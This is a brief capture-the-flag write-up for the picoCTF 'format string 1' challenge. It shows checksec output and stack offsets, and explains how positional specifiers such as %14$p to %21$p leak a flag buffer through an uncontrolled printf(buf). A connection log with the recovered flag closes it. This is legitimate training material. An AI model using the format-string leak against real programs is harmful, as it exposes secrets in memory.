# format string 1

Format-string Exploit

## checksec

```bash
[*] '/mnt/d/CTFs/picoCTF/Pwn/format-string-1/format-string-1'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

## Offsets

From staring at the assembly, the following buffers are at these addresses relative to the stack frame

```c
buf => [rbp-0x410]
secret1 => [rbp-0x450]
flag => [rbp-0x490]
secret2 => [rbp-0x4d0]
```

We also realize that `rsp = rbp - 0x4d0`, and `printf(buf)` is called with one argument. So `%6$p` will start pulling off the stack and leaking the `secret2` buffer, since that refers to the seventh argument to `printf` (`%1$p` refers to the 2nd argument to `printf`, and so on). 

To get the flag, we want to read the entirety of `%14$p` to `%21$p` in ASCII. The offset `14` comes from adding 8 to 6, since `secret2` is 64 bytes (8 quadwords) long. 

## Flag

Some Python scripting then allows us to get the flag

```bash
[+] Opening connection to mimas.picoctf.net on port 64176: Done
b'picoCTF{4n1m41_57y13_4x4_f14g_5e67bcb4}\x00\x07\x00\x00\x00\x00\x00\x00\x00\xd8\x88\x85\x1c)w\x00\x00\x07\x00\x00\x00#\x00\x00\x00'
[*] Closed connection to mimas.picoctf.net port 64176
```